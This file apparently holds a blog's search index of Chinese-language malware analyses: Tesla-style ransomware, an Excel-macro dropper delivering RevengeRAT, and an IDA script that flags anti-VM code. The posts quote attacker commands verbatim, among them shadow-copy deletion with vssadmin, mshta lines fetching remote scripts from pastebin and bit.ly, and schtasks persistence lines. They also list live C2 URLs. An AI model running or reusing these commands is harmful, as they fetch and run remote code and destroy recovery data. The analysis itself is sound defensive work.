@@ -1,0 +1,1132 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  
+  
+  
+  <entry>
+    <title>tesla勒索病毒分析</title>
+    <link href="undefined2019/09/10/%E7%97%85%E6%AF%92%E6%8A%A5%E5%91%8A/"/>
+    <url>2019/09/10/%E7%97%85%E6%AF%92%E6%8A%A5%E5%91%8A/</url>
+    
+    <content type="html"><![CDATA[<p><a href="#基本信息">基本信息 1</a></p><p><a href="#简介">简介 2</a></p><p><a href="#流程图">流程图 3</a></p><p><a href="#详细分析">详细分析 3</a></p><p><a href="#原始程序">原始程序 5</a></p><p><a href="#检测虚拟机">检测虚拟机 5</a></p><p><a href="#动态解密程序字符串">动态解密程序字符串 6</a></p><p><a href="#删除ads数据备用流">删除ADS（数据备用流） 8</a></p><p><a href="#释放文件开启新进程">释放文件，开启新进程 9</a></p><p><a href="#删除自身">删除自身 9</a></p><p><a href="#新进程">新进程 9</a></p><p><a href="#初始化工作">初始化工作 10</a></p><p><a href="#创建互斥体">创建互斥体 10</a></p><p><a href="#获取一些权限">获取一些权限 10</a></p><p><a href="#获取文件校验">获取文件校验 11</a></p><p><a href="#对抗常见监控软件">对抗常见监控软件 12</a></p><p><a href="#删除卷影">删除卷影 13</a></p><p><a href="#生成aes需要的密钥">生成AES需要的密钥 14</a></p><p><a href="#加入开机启动">加入开机启动 15</a></p><p><a href="#生成勒索文本和图片">生成勒索文本和图片 15</a></p><p><a href="#加密文件">加密文件 17</a></p><p><a href="#展示勒索信息">展示勒索信息 19</a></p><p><a href="#发送信息到c2服务器">发送信息到C2服务器 19</a></p><p><a href="#样本朔源">样本朔源 21</a></p><p><a href="#查杀方案">查杀方案 21</a></p><p><a href="#总结">总结 21</a></p><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><p>文件: C:\Users\john\Documents\dorjlo.exe</p><p>大小: 240640 字节</p><p>修改时间: 2017年11月25日, 16:57:32</p><p>MD5: 72CCC18F3038E19273010D45AC2142CE</p><p>SHA1: A47612524C64636C2ADB2FE01E09DFEFACB78ACA</p><p>CRC32: DAA773C2</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>该木马为勒索软件，对抗常见监控软件，释放文件到其他目录，删除自身躲避怀疑，动态解密访问敏感字API，加入开机启动，持久会攻击</p><h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><p><img src="media/65a079c1ada0bb0f74dfa6b6d7b01711.png" srcset="/img/loading.gif" alt></p><h2 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h2><p>程序自动打开这勒索信息，程序自身被删除</p><p><img src="media/7c9dbba8daece8a54872e51002b98c4b.png" srcset="/img/loading.gif" alt></p><p>文件都被加密</p><p><img src="media/bc433a131c6ae12478b5e282a040b3c4.png" srcset="/img/loading.gif" alt></p><p>桌面以及每个被加密文件夹都创建了一个txt和图片</p><p><img src="media/68f54f80f6f9e825d3466644f323ff13.png" srcset="/img/loading.gif" alt></p><h3 id="原始程序"><a href="#原始程序" class="headerlink" title="原始程序"></a>原始程序</h3><h4 id="检测虚拟机"><a href="#检测虚拟机" class="headerlink" title="检测虚拟机"></a>检测虚拟机</h4><p><img src="media/f2e93c73a413fd5c063fddcc476e16df.png" srcset="/img/loading.gif" alt></p><p>通过Com组件检测系统的状态，因为一般虚拟机沙箱功能都模仿不完，这里检测系统的视频音频设备，操作设备句柄，随机加入一些过滤器，如果是在沙箱环境和真实机返回结果不同</p><h4 id="动态解密程序字符串"><a href="#动态解密程序字符串" class="headerlink" title="动态解密程序字符串"></a>动态解密程序字符串</h4><p>这个程序为了对抗杀毒软件，利用程序运行是动态释放关键字符串，加载敏感函数之类的。</p><p><img src="media/ab14b2c23c22fbcc2877410c12874085.png" srcset="/img/loading.gif" alt></p><p>解密的VI首先被加密，先解码出后面解密索要的VI值</p><p><img src="media/172bab54a77ba898be89be56d3bc32a5.png" srcset="/img/loading.gif" alt></p><p>利用上面解码出来的vi，带去解密unk_435f80中密文</p><p>解密后会传入一个数据处理函数然乎放入新开的堆空间中，如下</p><p><img src="media/992217dad80e7e8516fca22645e471dd.png" srcset="/img/loading.gif" alt></p><p>将数据按分号分隔</p><p><img src="media/843b88f11062dc676e1a73d150f2a169.png" srcset="/img/loading.gif" alt></p><p><img src="media/511410a5ac83b4376f79c90d6ea4c61d.png" srcset="/img/loading.gif" alt></p><p>后面还有几处解密，分别是</p><p><img src="media/b86a73c977a7aa8753f4d81ef56fd68b.png" srcset="/img/loading.gif" alt></p><p><img src="media/38f3c8731ba264eb3e32679ef2799255.png" srcset="/img/loading.gif" alt></p><p><img src="media/44a3520a6ae8fbc27203bdae3d5cfcaa.png" srcset="/img/loading.gif" alt></p><p>这些都是程序后面使用到的常量字符串</p><h4 id="删除ADS（数据备用流）"><a href="#删除ADS（数据备用流）" class="headerlink" title="删除ADS（数据备用流）"></a>删除ADS（数据备用流）</h4><p><img src="media/51b8159f57af57c7f65d304a6e9db274.png" srcset="/img/loading.gif" alt></p><p>删除备用流信息，避免UAC的弹窗</p><h4 id="释放文件，开启新进程"><a href="#释放文件，开启新进程" class="headerlink" title="释放文件，开启新进程"></a>释放文件，开启新进程</h4><p><img src="media/01b99ef2e5186de04a4f9f5e2ef80632.png" srcset="/img/loading.gif" alt></p><p>将自身拷贝到document下，重命名为随机字符名，设置文件为隐藏</p><p>然后新开进程，程序则是复制过去的程序</p><h4 id="删除自身"><a href="#删除自身" class="headerlink" title="删除自身"></a>删除自身</h4><p><img src="media/25f67f7094f960345effb6a7446a6c9d.png" srcset="/img/loading.gif" alt></p><p>创建新进程后，程序会删除自身。</p><h3 id="新进程"><a href="#新进程" class="headerlink" title="新进程"></a>新进程</h3><p>前面的主程序释放到document后，创建新的进程，然后删除了自己，现在来看看这个新进程的流程</p><h4 id="初始化工作"><a href="#初始化工作" class="headerlink" title="初始化工作"></a>初始化工作</h4><p>因为是拷贝的原程序，所以初始化行为和之前的程序一样，都有恢复字符串，获取某些函数的地方</p><p>不同的地方在于一个路径检测</p><p><img src="media/aa265c96529c7fa335fdb89595daa1ee.png" srcset="/img/loading.gif" alt></p><p>GerLastError第一次返回2，因为document里面还没有这个文件</p><p>第二次GerLastError这个地方<br>返回的值为0，因为第二次程序是在document目录下启动的，CreateFile也就能找到文件。所以这样就能判断是第一次运行还是已经是释放后的程序了。</p><h4 id="创建互斥体"><a href="#创建互斥体" class="headerlink" title="创建互斥体"></a>创建互斥体</h4><p>因为他是一个勒索样本，如果程序多次运行会导致多次加密，造成文件不能恢复，所以加入一个互斥体，老保证只有一个自己在运行</p><p><img src="media/66ada1f5f6176c2ad6d0ac06b55b5821.png" srcset="/img/loading.gif" alt></p><p>创建一个名为9_9_9_9的互斥体</p><h4 id="获取一些权限"><a href="#获取一些权限" class="headerlink" title="获取一些权限"></a>获取一些权限</h4><p>将访问令牌中禁用的权限启用，来达到权限提升</p><p><img src="media/844c46900afa68c0e1ebb1fa79eecc08.png" srcset="/img/loading.gif" alt></p><p>提升权限，便于后面对特殊文件的操作</p><h4 id="获取文件校验"><a href="#获取文件校验" class="headerlink" title="获取文件校验"></a>获取文件校验</h4><p><img src="media/6d3aa35401be183881cc4421d49a6ab3.png" srcset="/img/loading.gif" alt></p><p><img src="media/63731167cee7cad79a85244d4d07b26a.png" srcset="/img/loading.gif" alt></p><p>这个样本返回的是一个int16，所以这里返回451，这个值最后会发送给样本作者，我认为这个值是可以来替代版本信息，告诉样本作者，被勒索者中的是哪个版本的木马。</p><h4 id="对抗常见监控软件"><a href="#对抗常见监控软件" class="headerlink" title="对抗常见监控软件"></a>对抗常见监控软件</h4><p>通过枚举进程，检测进程名，来关闭一些常见的监控软件，进程包含关键字taskmg,regedit,procex,msconfi,cmd，只要在进程名中匹配到，则使用TerminlProcess强行关闭这个进程</p><p><img src="media/bcd787a517602ef92508106efbf1d2e3.png" srcset="/img/loading.gif" alt></p><h4 id="删除卷影"><a href="#删除卷影" class="headerlink" title="删除卷影"></a>删除卷影</h4><p>先判断如果版本不是WinXP2600那就执行删除卷影线程</p><p><img src="media/ba1b9a7b8cca943fe87e53df94d04cd9.png" srcset="/img/loading.gif" alt></p><p><img src="media/bca1af69ed942921170fa79982597c5f.png" srcset="/img/loading.gif" alt></p><p>通过ShellExecuteExW执行vssadmin.exe Delete Shadows /All /Quiet<br>来删除卷影，这个操作会触发系统UAC提示</p><h4 id="生成AES需要的密钥"><a href="#生成AES需要的密钥" class="headerlink" title="生成AES需要的密钥"></a>生成AES需要的密钥</h4><p>待补</p><p>使用现有的椭圆曲线算法，使用hash生成一段值，这个值去当AES的密钥，去解密一段数据，而这个返回的数据就是后面赋值给文件加密AES算法256位的密钥。所以只需要找到hash生成的规则就能找到逻辑。</p><p><img src="media/7a0d8e2d354c0540a40737d3f0a9fb85.png" srcset="/img/loading.gif" alt></p><p>下图中的Key_45f4ec其实就是上面V27的地址，所以就能推出加密key的数据</p><p><img src="media/2c32c1069e4afb99209fbe27b7adabbd.png" srcset="/img/loading.gif" alt></p><h4 id="加入开机启动"><a href="#加入开机启动" class="headerlink" title="加入开机启动"></a>加入开机启动</h4><p><img src="media/9bebbddf42c5782eb2c034b9b247b28b.png" srcset="/img/loading.gif" alt></p><p>将释放的文件加入开机启动注册表项中，持续化攻击。</p><h4 id="生成勒索文本和图片"><a href="#生成勒索文本和图片" class="headerlink" title="生成勒索文本和图片"></a>生成勒索文本和图片</h4><p>使用gdi对象，调用GdipCreateBitmapFromHBITMAP 构建一个位图，保存勒索信息</p><p><img src="media/79d9bee8d370b001bdc182a3e929c439.png" srcset="/img/loading.gif" alt></p><p><img src="media/a1e9de4dd124b2d4719e86d2200ab7fc.png" srcset="/img/loading.gif" alt></p><p>chText中就保存着图片的二进制的信息</p><h4 id="加密文件"><a href="#加密文件" class="headerlink" title="加密文件"></a>加密文件</h4><p>这个程序新开一个线程进行问价加密和释放勒索信息，因为加密过程较长，所以将这个进程优先级调低，然他最后执行</p><p><img src="media/62489ed592b27c4b36eda7cecfb39ac6.png" srcset="/img/loading.gif" alt></p><p>加密函数是这个样本的核心</p><p>首先获取了逻辑分区的信息，返回结果存入Buffer</p><p><img src="media/8a2b3e30dd0d61736a16632fabd5dc20.png" srcset="/img/loading.gif" alt></p><p>便利这个Buffer，按序查看当前分区是否是<br>固定磁盘，移动磁盘和远程磁盘这三种格式，是如果，就开始执加密流程</p><p><img src="media/ca2bc8e13680f04d89b8a5030be3ab73.png" srcset="/img/loading.gif" alt></p><p>查找目录下的文件</p><p><img src="media/79ac90dc641baf3d37587263f5491c74.png" srcset="/img/loading.gif" alt></p><p>首先判断是否是目录，如果是C:\windows或C:\Program Files文件夹，则跳过不加密</p><p>这个函数会递归调用自己去到便利目录，然后会执行WritePngText函数</p><p><img src="media/2d3a38af95580fe08b622bb02b60b889.png" srcset="/img/loading.gif" alt></p><p>给每个遍历的文件夹都写入勒索图片和txt文档，除了几个桌面，和刻录文件夹</p><p>因为如果往刻录文件夹写入东西，操作系统或提示你有文件需要刻录，木马作者也是想到了这一点。</p><p>回到上一个函数</p><p>如果不是目录呢？</p><p><img src="media/85debd894d8da4003578bab1a256ce5f.png" srcset="/img/loading.gif" alt></p><p>首先排除几个不加密的（自身和.com结尾的文件），然后就是要加密的文件，匹配以下后缀进行加密</p><p>r3d,ptx,pef,srw,x3f,der,cer,crt,pem,odt,ods,odp,odm,odc,odb,doc,docx,kdc,mef,mrwref,nrw,orf,raw,rwl,rw2,mdf,dbf,psd,pdd,pdf,eps,jpg,jpe,dng,3fr,arw,srf,sr2,bay,crw,cr2,dcr,ai,indd,cdr,erf,bar,hkx,raf,rofl,dba,db0,kdb,mpqge,vfs0,mcmeta,m2,lrf,vpp_pc,ff,cfr,snx,lvl,arch00,ntl,fsh,itdb,itl,mddata,sidd,sidn,bkf,qic,bkp,bc7,bc6,pkpass,tax,gdb,qdf,t12,t13,ibank,sum,sie,zip,w3x,rim,psk,tor,vpk,iwd,kf,mlx,fpk,dazip,vtf,,vcf,esm,blob,dmp,layout,menu,ncf,sid,sis,ztmp,vdf,mov,fos,sb,itm,wmo,itm,map,wmo,sb,svg,cas,gho,syncdb,mdbackup,hkdb,hplg,hvpl,icxs,docm,wps,xls,xlsx,xlsm,xlsb,xlk,ppt,pptx,pptm,mdb,accdb,pst,dwg,xf,dxg,wpd,rtf,wb2,pfx,p12,p7b,p7c,txt,jpeg,png,rb,css,js,flv,m3u,py,desc,xxx,litesql,wallet,big,pak,rgss3a,epk,bik,slm,lbf,sav,re4,apk,bsa,ltx,forge,asset,litemod,iwi,das,upk,d3dbsp,csv,wmv,avi,wma,m4a,rar,7z,mp4,sql,bak,tiff</p><p>看看加密函数</p><h4 id="展示勒索信息"><a href="#展示勒索信息" class="headerlink" title="展示勒索信息"></a>展示勒索信息</h4><p>当全部文件都被加密后，打开txt和png展示在桌面</p><p><img src="media/adb2a28bb4f7f975d90ad2c540586a69.png" srcset="/img/loading.gif" alt></p><h4 id="发送信息到C2服务器"><a href="#发送信息到C2服务器" class="headerlink" title="发送信息到C2服务器"></a>发送信息到C2服务器</h4><p>打开一个网络连接对象，参数设置的是火狐的Header</p><p>Mozilla/5.0 (Windows NT 6.3 rv:11.0) like Gecko</p><p><img src="media/a206a6b5e975288263c5a46c20e85710.png" srcset="/img/loading.gif" alt></p><p>最后将之前生成的四个关键值一起都格式化为一个字符串,并加密</p><p><img src="media/48467d2d131ca37f501598d8e51675e2.png" srcset="/img/loading.gif" alt></p><p><img src="media/1e71d2d85bc1e2157e5711385cd9acfc.png" srcset="/img/loading.gif" alt></p><p>开始模拟浏览器发送数据</p><p><img src="media/9fd050e9b9db36a9bb88f5db0fc11e34.png" srcset="/img/loading.gif" alt></p><p>设置虚拟浏览器配置</p><p><img src="media/125abbc8eb7c5f1495010a2680b9ffa8.png" srcset="/img/loading.gif" alt></p><p>最后发送被加密的信息给服务服务器，如果发送成功，就退出。</p><p>分别向下面六个网页发送关键密钥</p><p><a href="http://videoaminproduktion.de/plugins/binstr.php" target="_blank" rel="noopener">http://videoaminproduktion.de/plugins/binstr.php</a></p><p><a href="http://clubsaintandre.fr/images/binstr.php" target="_blank" rel="noopener">http://clubsaintandre.fr/images/binstr.php</a></p><p><a href="http://affiliateproductes.com/binstr.php" target="_blank" rel="noopener">http://affiliateproductes.com/binstr.php</a></p><p><a href="http://ptgp.pl/tmp/binstr.php" target="_blank" rel="noopener">http://ptgp.pl/tmp/binstr.php</a></p><p><a href="http://strategicdisaster.info/wordpress/wp-content/plugins/binstr.php" target="_blank" rel="noopener">http://strategicdisaster.info/wordpress/wp-content/plugins/binstr.php</a></p><p><a href="http://minteee.com/images/binstr.php" target="_blank" rel="noopener">http://minteee.com/images/binstr.php</a></p><table><thead><tr><th>域名/IP</th><th>获取的IP地址</th><th>数字地址</th><th>IP的物理位置</th></tr></thead><tbody><tr><td><a href="http://strategicdisaster.info/" target="_blank" rel="noopener">strategicdisaster.info</a></td><td>域名解析失败</td><td></td><td></td></tr><tr><td><a href="http://affiliateproductes.com/" target="_blank" rel="noopener">affiliateproductes.com</a></td><td>域名解析失败</td><td></td><td></td></tr><tr><td><a href="javascript:" target="_blank" rel="noopener">ptgp.pl</a></td><td><a href="http://ip.tool.chinaz.com/?ip=85.128.216.188" target="_blank" rel="noopener">85.128.216.188</a></td><td>1434507452</td><td>波兰</td></tr><tr><td><a href="http://clubsaintandre.fr/" target="_blank" rel="noopener">clubsaintandre.fr</a></td><td>域名解析失败</td><td></td><td></td></tr><tr><td><a href="javascript:" target="_blank" rel="noopener">minteee.com</a></td><td><a href="http://ip.tool.chinaz.com/?ip=85.13.137.133" target="_blank" rel="noopener">85.13.137.133</a></td><td>1426950533</td><td>德国</td></tr><tr><td><a href="javascript:" target="_blank" rel="noopener">videoaminproduktion.de</a></td><td><a href="http://ip.tool.chinaz.com/?ip=87.238.192.67" target="_blank" rel="noopener">87.238.192.67</a></td><td>1475264579</td><td>德国</td></tr></tbody></table><h2 id="样本朔源"><a href="#样本朔源" class="headerlink" title="样本朔源"></a>样本朔源</h2><h2 id="查杀方案"><a href="#查杀方案" class="headerlink" title="查杀方案"></a>查杀方案</h2><ol><li><p>删除注册表程序启动项</p></li><li><p>删除源程序和document下隐藏的6位随机字符的.exe文件</p></li><li><p>可以创建要个名为9_9_9_9的互斥体，来组织程序启动</p></li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>该木马主要还是加密文档类的文件，这个木马会有弹窗提示删除卷影，所以会让人起疑，其实也能想是恶意软件，这种木马，启发式的安全软件都能检测识别。安装联网安全软件，能保证不是已知的木马</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>样本详细分析</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>加密 勒索</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Lunlayloo 木马</title>
+    <link href="undefined2019/09/06/Lunlayloo%20%E6%9C%A8%E9%A9%AC/"/>
+    <url>2019/09/06/Lunlayloo%20%E6%9C%A8%E9%A9%AC/</url>
+    
+    <content type="html"><![CDATA[<h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table><thead><tr><th>FileName</th><th>FileType</th><th>MD5</th><th>Size</th></tr></thead><tbody><tr><td>Order____679873892.xls</td><td>rat</td><td>7641FEF8ABC7CB24B66655D11EF3DAF2</td><td>41472 bytes</td></tr><tr><td>## 简介</td><td></td><td></td><td></td></tr><tr><td>该样本语言类型为 VBS和JS编写，中间过程完全使用无文件格式，内容也都能随时在线更改，在一定程序上能躲避安全软件的查杀，通过不同混淆更容易达到免杀的效果。</td><td></td><td></td><td></td></tr></tbody></table><h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><p><img src="https://img-blog.csdnimg.cn/20190920124614242.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p><h2 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h2><p>文件有宏，且宏有密码，可以使用<code>offkey</code>直接更改宏密码<br>进入宏代码后在<code>shell(fun)</code>处下断，可以拿到shell 的连接地址<br><img src="https://img-blog.csdnimg.cn/20190916212336956.png" srcset="/img/loading.gif" alt="在这里插入图片描述"> <code>mshta http://bit.ly/8hsshjahassahsh</code></p><p>打开这个页面看似是一个正常页面，但仔细查找是能在源码中找到恶意js代码的<br><img src="https://img-blog.csdnimg.cn/20190917141638561.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>拿出来使用<code>console</code>打印出来<br><img src="https://img-blog.csdnimg.cn/20190917141856253.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190917143320931.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>处理后执行了<code>WScript.Shell.Run mshta http://www.pastebin.com/raw/nv5d9pYu,vbHide</code><br>看看究竟是什么东西<br>木马作者选择了一个匿名代码存放地址网站，来逃避追踪。<br>但是目前这个RWA地址页面已经被删除了<br><img src="https://img-blog.csdnimg.cn/20190917143741625.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>这个样本在any.run上有人运行过，有记录，所以可以找到这个访问记录。<br><a href="https://app.any.run/tasks/0100486e-1711-4af6-a437-74ad27216f36/" target="_blank" rel="noopener">https://app.any.run/tasks/0100486e-1711-4af6-a437-74ad27216f36/</a><br><img src="https://img-blog.csdnimg.cn/20190917144032656.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>拿出这个代码<br><img src="https://img-blog.csdnimg.cn/20190917144558325.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>下面看看怎么玩的，关闭打开的excel word ppt msp软件，让中马的人以为想不到是宏的原因，给人 眼部见为净 的感觉</p><p><img src="https://img-blog.csdnimg.cn/20190917151722331.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p><p>接着又安装两个计划任务，来持久化攻击和进一步执行操作</p><p><code>schtasks /create /sc MINUTE /mo 60 /tn Windows Update /tr mshta.exe http://pastebin.com/raw/vXpe74L2 /F</code><img src="https://img-blog.csdnimg.cn/20190917154541622.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><code>schtasks /create /sc MINUTE /mo 300 /tn Update /tr mshta.exe http://pastebin.com/raw/JdTuFmc5 /F</code><br><img src="https://img-blog.csdnimg.cn/20190917154555627.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>通过schtasks  创建两个计划任务来执行两个脚本文件<br>还加入了一个开启自启动<br><img src="https://img-blog.csdnimg.cn/2019091715561730.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p><p>接下来看看这三个脚本是怎么操作的</p><p><code>JdTuFmc5</code> 又是一系列加密，下面是解密后的结果</p><p><img src="https://img-blog.csdnimg.cn/20190919105945345.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>尝试去下载并执行两个.net编写的可执行程序，暂时命名为<code>bit1.bin</code>和<code>2bit1.bin</code>后面分析</p><p>在<code>wMG90xwi</code>这个raw中定义了一个<code>$a</code>对象，这个对象是将上面的bit1.bin读入内存的对象，可以直接使用<br><img src="https://img-blog.csdnimg.cn/20190919105430408.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>使用dnspy打开反编译这个dll</p><p>里面就有<code>THC452563sdfdsdfgr4777cxg04477fsdf810df777</code>类和它的方法<code>retrt477fdg145fd4g0wewerwedsa799221dsad4154qwe(string FTONJ, byte[] coco)</code> </p><p><img src="https://img-blog.csdnimg.cn/20190919110436546.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>然后使用<code>Invoke</code>去调用了这个方法，且传入的参数是(‘MSBuild.exe’,$f)</p><p>查一下壳，发现是加了<code>Confuser</code>的混淆</p><p>解完混淆之后再看<br><img src="https://img-blog.csdnimg.cn/20190920183121543.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>会按照顺序去检测文件<code>MSBuild.exe</code>存在在哪，然后调用<code>ticklens</code><br><img src="https://img-blog.csdnimg.cn/20190920183342286.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><code>PEHeaderE</code>函数是在修改程序自身代码<br><img src="https://img-blog.csdnimg.cn/20190920184816602.png" srcset="/img/loading.gif" alt="在这里插入图片描述">主要看<code>FUN</code><br><img src="https://img-blog.csdnimg.cn/20190920184846835.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>发现是在循环调用<code>smethod_0</code>方法，这个方法就是真正的创建傀儡进程</p><p><code>lpname</code> 指向要打开的进程</p><p><code>lpBuf</code> 是要注入的数据</p><p><img src="https://img-blog.csdnimg.cn/20190920185315420.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/2019092018553021.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190920185552483.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190920185722874.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190920185657512.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190920185749272.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>上面就是典型的进程注入  作用是将第二个可执行程序注入到<code>MSBuild.exe</code>中</p><p>这里就直接看一下 这个注入的程序到底是什么</p><p>反编译下一个2bit2.bin</p><p>根据关键字搜索，可以发现这是<code>RevengeRAT</code>远控生成的客户端<br><img src="https://img-blog.csdnimg.cn/20190920111854823.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>这个远控是一个有免费版本，网络上也有泄露的版本，因为是.net编写，基本功能也都能识别出来</p><p>首先是C2地址 <code>meandmyjoggar.duckdns.org:777</code></p><p>程序互斥体名 <code>RV_MUTEX-WindowsUpdateSysten32</code></p><p>两个计划任务和加入的启动项注册表都是一样的程序，这里就不累述了</p><p><strong>总的来说就是将远控代码注入到一个正常的程序中，来达到执行且躲避安全软件</strong></p><h2 id="IOC"><a href="#IOC" class="headerlink" title="IOC"></a>IOC</h2><table><thead><tr><th>域名</th><th>类型</th></tr></thead><tbody><tr><td><a href="http://www.pastebin.com/raw/nv5d9pYu" target="_blank" rel="noopener">http://www.pastebin.com/raw/nv5d9pYu</a></td><td>C&amp;C</td></tr><tr><td><a href="http://pastebin.com/raw/vXpe74L2" target="_blank" rel="noopener">http://pastebin.com/raw/vXpe74L2</a></td><td>C&amp;C</td></tr><tr><td><a href="http://pastebin.com/raw/JdTuFmc5" target="_blank" rel="noopener">http://pastebin.com/raw/JdTuFmc5</a></td><td>C&amp;C</td></tr><tr><td><a href="http://pastebin.com/raw/CGe3S2Vf" target="_blank" rel="noopener">http://pastebin.com/raw/CGe3S2Vf</a></td><td>C&amp;C</td></tr><tr><td><a href="https://pastebin.com/raw/wMG90xwi" target="_blank" rel="noopener">https://pastebin.com/raw/wMG90xwi</a></td><td>C&amp;C</td></tr><tr><td><a href="https://pastebin.com/raw/W455MkAZ" target="_blank" rel="noopener">https://pastebin.com/raw/W455MkAZ</a></td><td>C&amp;C</td></tr><tr><td>meandmyjoggar.duckdns.org:777</td><td>C&amp;C</td></tr></tbody></table><h2 id="查杀方案"><a href="#查杀方案" class="headerlink" title="查杀方案"></a>查杀方案</h2><p>关闭<code>MSBuild.exe</code>进程<br>删除计划任务名为<code>Windows Update</code>和<code>Update</code>的任务<br>删除<code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run\AvastUpdate</code>表项<br>删除<code>Order____679873892.xls</code></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>感染链复杂，控制解密繁琐，多方面控制持久化操作，无文件攻击，技术含量高。个人以及企业中需要时刻面对各种威胁，要时刻保持警惕，防患于未然。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>样本详细分析</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Rat H-worm</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>IDA 查找检测虚拟机代码</title>
+    <link href="undefined2019/09/05/ida%E6%9F%A5%E6%89%BE%E6%A3%80%E6%B5%8B%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BB%A3%E7%A0%81/"/>
+    <url>2019/09/05/ida%E6%9F%A5%E6%89%BE%E6%A3%80%E6%B5%8B%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BB%A3%E7%A0%81/</url>
+    
+    <content type="html"><![CDATA[<p>FindAntiVM <a href="https://github.com/zim123abc/virtualization-detection-ida-script/blob/dd8015ec6e130cf04272805730c78950b857c02b/src/findAntiVM.py" target="_blank" rel="noopener">来自github</a></p><p>如果找到，以红色标注</p><pre><code class="python">from idautils import *from idc import *heads = Heads(SegStart(ScreenEA()), SegEnd(ScreenEA()))#Calls to autorun/autorunsc -- these hide signed MS entries!!pill_check = [&#39;sidt&#39;, &#39;sgdt&#39;, &#39;sldt&#39;, &#39;smsw&#39;, &#39;str&#39;, &#39;in&#39;]malicious_check = [&#39;cmd&#39;,&#39;cpuid&#39;,&#39;autorun&#39;, &#39;autorunsc&#39;]vmware_check = [&#39;Vmtoolsd&#39;, &#39;Vmwaretrat&#39;, &#39;Vmwareuser&#39;, &#39;Vmacthlp&#39;]vbox_check = [&#39;vboxservice&#39;, &#39;vboxtray&#39;, &#39;VBOXBIOS&#39;]hostname_check = [&#39;brbrb-d8fb22af1&#39;,&#39;KVMKVMKVM&#39;, &#39;prl hyperv&#39;, &#39;Microsoft Hv&#39;, &#39;XenVMMXenVMM&#39;]env_check = [&#39;dmesg&#39;, &#39;kmods&#39;, &#39;pcidevs&#39;,&#39; dmidecode&#39;,&#39;sysfs&#39;,&#39;procfs&#39;, &#39;dashXmstdout&#39;]antiVM = []for i in heads:        for x in pill_check,vmware_check,vbox_check,hostname_check,env_check,malicious_check:                if GetMnem(i) in x:                     antiVM.append(i)#reset head to beginning of instructionsheads = Heads(SegStart(ScreenEA()), SegEnd(ScreenEA()))#Check out Hex View-A for I/O portsfor x in heads:        if GetMnem(x) == &quot;mov&quot; and &quot;eax&quot; in GetOpnd(x, 0) and &quot;564D5868h&quot; in GetOpnd(x, 1):                if GetMnem(x + 1) == &quot;mov&quot; and &quot;edx&quot; in GetOpnd(x + 1, 0) and &quot;5658h&quot; in GetOpnd(x + 1, 1):                        if GetMnem(x + 2) == &quot;in&quot; and &quot;eax&quot; in GetOpnd(x + 2, 0) and &quot;dx&quot; in GetOpnd(x + 2, 1):                                antiVM.append(x)        elif GetMnem(x) == &quot;call&quot; and &quot;RtlGetNativeSystemInformation&quot; in GetOpnd(x, 0):                antiVM.append(x)        if &quot;564D5868h&quot; in GetOpnd(x, 1) or &quot;5658h&quot; in GetOpnd(x, 1):                antiVM.append(x)for i in antiVM:    SetColor(i, CIC_ITEM, 0x0000ff)        instruction = GetMnem(i)    Message(&quot;Anti-VM: %08x &gt;&gt;&quot; % i)        Message(&quot; %s\n&quot; % instruction)print &quot;Number of potential Anti-VM instructions: %d&quot; % (len(antiVM))</code></pre><p>或者使用<code>ScoopyNG</code>工具检测</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>逆向</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>IDA</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Com组建检测虚拟沙箱</title>
+    <link href="undefined2019/09/04/Com%E6%B7%BB%E5%8A%A0%E8%BF%87%E6%BB%A4%E5%99%A8%E6%9D%A5%E6%A3%80%E6%B5%8B%E6%B2%99%E7%AE%B1/"/>
